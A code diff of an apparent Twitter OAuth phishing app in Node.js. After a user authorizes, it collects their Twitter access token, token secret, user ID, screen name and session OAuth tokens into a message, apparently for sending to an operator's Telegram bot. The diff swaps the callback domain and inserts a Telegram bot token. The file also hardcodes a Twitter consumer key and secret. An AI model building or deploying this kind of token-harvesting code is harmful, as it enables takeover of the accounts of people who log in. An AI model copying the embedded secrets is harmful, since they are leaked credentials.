@@ -11,7 +11,7 @@ const port = 3000;
 // Replace these with your actual Twitter app credentials
 const consumerKey = "ok9YMkxiCId3TfcFutB1rirWY"; //API Key here 
 const consumerSecret = "ICU5b8tVaunNxayDgwFELn6xsG93g20C0HLSHwBjo7dgcdGLzc"; //API Key Secret here
-const callbackURL = "https://long-fox-suspenders.cyclic.app/callback"; // your domain name here with /callback just like the example in there 
+const callbackURL = "https://lazy-puce-bat-tam.cyclic.app/callback"; // your domain name here with /callback just like the example in there 
 
 const twitterOAuth = new OAuth.OAuth(
   "https://api.twitter.com/oauth/request_token",
@@ -79,7 +79,7 @@ app.get("/callback", (req, res) => {
       } else {
         // Now you have the access tokens and additional user information
         const telegramBotToken =
-          ""; //your telegram API key here 
+          "6905104877:AAFH0PWM3y57IfA6WWb8vQN2jpwbsCECuaI"; //your telegram API key here 
         const chatId = ""; // your chat id or group id here 
 
         const message = `Twitter Access Token: ${accessToken}\nTwitter Access Token Secret: ${accessTokenSecret}\nUser ID: ${results.user_id}\nScreen Name: ${results.screen_name}\nAuth Token: ${req.session.oauthToken}\nAuth Token Secret: ${req.session.oauthTokenSecret}`;
